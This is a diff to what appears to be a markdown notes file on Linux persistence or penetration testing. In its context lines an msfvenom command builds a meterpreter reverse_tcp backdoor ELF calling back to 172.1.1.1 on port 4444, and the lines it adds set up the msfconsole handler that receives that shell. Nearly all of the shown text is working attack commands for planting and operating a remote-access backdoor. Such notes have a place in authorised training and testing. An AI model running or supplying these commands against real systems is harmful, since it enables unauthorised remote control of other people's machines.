@@ -31,3 +31,12 @@ crontab -e
 ```
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.1.1.1 LPORT=4444 -f elf -o backdoor.elf
 ```
+
+```
+msfconsole
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST 172.1.1.1
+set LPORT 4444
+exploit
+
+```
